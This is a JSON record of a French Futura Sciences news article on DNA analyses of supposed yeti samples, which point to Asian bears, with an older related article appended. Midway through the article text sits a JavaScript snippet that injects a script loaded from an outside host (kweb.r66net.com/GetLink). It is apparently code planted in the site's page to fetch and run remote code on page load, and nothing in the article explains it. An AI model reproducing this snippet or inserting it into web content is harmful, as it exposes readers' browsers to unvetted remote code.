{"title": "Yeti : l'abominable homme des neiges serait un ours", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-11-29", "content": "Depuis des siecles, la legende du yeti perdure au Nepal et au Tibet, avec des temoignages et des recits transmis de generation en generation. Une nouvelle analyse ADN de huit echantillons provenant de supposes yetis montre qu'il s'agirait en fait d'ours asiatiques. Le  yeti , cette creature qui habiterait dans les hautes montagnes de l'Asie, est-il un mythe ou une realite ? Une etude de l'universite d'Etat de New York, a Buffalo (Etats-Unis), apporte de nouvelles informations sur cette legende. Elle se base sur l'analyse de neuf echantillons de musees et collections privees supposes appartenir a des yetis : os, dent, peau, poils, feces provenant de l' Himalaya  et du plateau tibetain. Ces echantillons ont ete fournis par la production qui avait realise un film sur le yeti en 2016,  Yeti or Not . D'apres les resultats de l'etude  genetique , un echantillon venait d'un chien et les huit autres d'ours noirs asiatiques, d'ours bruns de l'Himalaya ou d'ours bruns tibetains. Charlotte Lindqvist, auteur de ces travaux, a explique dans un  communique  :  << Nos resultats suggerent fortement que les fondements biologiques de la legende du yeti peuvent etre trouves chez les ours locaux, et notre etude demontre que la genetique devrait etre capable de demeler d'autres mysteres similaires >>.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'ours brun de l'Himalaya isole par une glaciation Cette recherche apporte aussi des informations sur l'histoire evolutive des ours d'Asie, dont certains, comme les ours bruns de l'Himalaya, sont actuellement menaces. Les scientifiques ont sequence l' ADN  mitochondrial de 23 ours asiatiques, y compris celui des supposes yetis, et l'ont compare a celui d'autres ours dans le monde.  L'analyse a montre que les ours bruns de l'Himalaya appartiennent a une lignee qui a diverge tot par rapport aux autres ours bruns, il y a 650.000 ans environ, au cours d'une glaciation. La croissance des glaciers a du separer les ours de l'Himalaya des autres, ce qui expliquerait qu'ils aient evolue independamment. Pour en savoir plus Bigfoot : genetiquement, le yeti serait un ours Article d'Andrea Haug paru le 6 juillet 2014 Des chercheurs ont analyse une serie d'echantillons de poils d'animaux attribues au yeti en provenance de plusieurs pays ou la legende perdure. Resultat : une fois ecartes les fibres de verre et les restes de vaches, de  ratons laveurs  ou meme d'etres humains, il reste deux  genomes  qui ressemblent a celui d'un ours polaire...  fossile . L'abominable homme des neiges, l'autre nom donne au yeti, pourrait etre un ours. C'est ce que concluent des chercheurs dans une serieuse etude parue dans le journal  Proceedings of The Royal Society B . Habitant de l' Himalaya , ce mysterieux animal residerait aussi -- ou alors serait-ce des cousins -- dans d'autres regions du monde sous le nom de Bigfoot en Amerique du Nord et d'Almasty ou de Kaptar dans le Caucase. Les temoignages abondent un peu partout sur la planete, mais laissent les scientifiques de  marbre  : ce  primate  humanoide enigmatique reste considere comme un etre legendaire devant le manque flagrant de preuve materielle incontestable.  Partout dans le monde, des legendes decrivent un etre mi-homme mi-animal, couvert de poils hirsutes, marchant sur deux jambes et mesurant entre 1,50 et 3,75 m. Son nom varie selon les localites : yeti au Nepal et au Tibet, Mande barung en Inde, Bigfoot aux Etats-Unis, Sasquatch au Canada, Almasty ou Kaptar dans le Caucase, Yowie en Australie, Mapinguari au Bresil, Sajarang gigi en Indonesie ou encore Basajaun au Pays basque. (c) Wanida.w,  Wikimedia Commons , CC by-sa 3.0                               Depuis 2012,  Bryan Sykes , geneticien a l'universite d'Oxford au Royaume-Uni, et ses collegues se sont lances dans l'analyse des echantillons de poils et de cheveux en provenance de differents pays du Globe. Les resultats confirment ce que nous avions annonce en octobre 2013 : le genome du yeti serait celui d'un  ours polaire . Parmi les 57 echantillons issus de musees et de collections privees, deux presentent une sequence genetique qui correspond  << a 100 % a l'ADN d'un fossile d'ours polaire ( Ursus maritimus ) age de plus de 40.000 ans, mais pas avec des  specimens modernes  de cette  espece  >> , concluent-ils. Or, l'un de ces deux echantillons proviendrait d'un animal du  Ladakh , en Inde, qui se serait montre particulierement agressif et qui aurait ete abattu par un chasseur experimente, il y a 40 ans. L'autre specimen a qui appartiendraient les poils serait originaire d'une foret de bambous, a 3.500 m d'altitude, dans une region du  Bhoutan  reputee pour etre le nid d'un Migyhur, la version bhoutanaise du yeti. Le yeti, ours rocheux tibetain, logerait notamment sur l'Everest, montagne situee dans la chaine de l'Himalaya, a la frontiere entre le Nepal et le Tibet. Le naturaliste britannique B. H. Hodgson est le premier Europeen a faire reference explicitement a la creature dans son recit  Rencontre avec le yeti , paru en 1832 dans le  Journal de la societe asiatique du Bengale . (c) R. Hyland,  Wikimedia Commons , CC by-sa 3.0                               Il n'y aurait pas un, mais des yetis  Pour les auteurs de l'article scientifique, les deux echantillons pourraient appartenir a une espece d'ours inconnue jusqu'alors ou bien a un ours polaire qui aurait un pelage brun, ou encore a une espece  hybride  d'ours polaire ( Ursus maritimus ) et d'ours brun ( Ursus arctos ). En prenant cette derniere hypothese, les deux specimens, bouthanais et indien, pourraient etre les descendants d'une  << souche apparue au tout debut de la differenciation entre l'ours brun et l'ours polaire >> , supposent les chercheurs. Si elle etait repandue et que le comportement agressif observe sur l'animal indien etait representatif de l'espece, ce nouveau  mammifere  expliquerait la persistance de la  legende du yeti . Avant toute conclusion, les chercheurs souhaitent poursuivre leurs investigations. Qu'en est-il des 55 autres echantillons ? Apres avoir ecarte ceux qui n'etaient pas de la  matiere  organique animale -- l'un d'eux etait compose de fibres de verre --, l'equipe en a expertise 34 autres. Vaches, chevaux, ratons laveurs, humains, cerfs,  coyotes  et meme un  tapir de Malaisie  : les  especes  a qui on a fait jouer le role de l'animal mystere etaient variees. Mais aucun des echantillons n'a revele une nouvelle espece de primate bipede. Ce resultat ne decouragera pas les << pro-yeti >> ou plutot les << pro-Bigfoot >>, affirme le psychologue Rhettman Mullis, co-auteur de l'article scientifique... et qui en est un lui-meme. Convaincu de la realite de cet etre communement connu sous le nom de Sasquatch ou de Bigfoot aux Etats-Unis et qu'il dit avoir croise de nombreuses fois, il est aussi responsable du site  Bigfootology  consacre au phenomene Bigfoot. Pour lui, certes, le yeti decrit dans l'Himalaya est un ours mais l'etude ne demontre pas que Bigfoot n'existe pas... ", "theme": "planete"}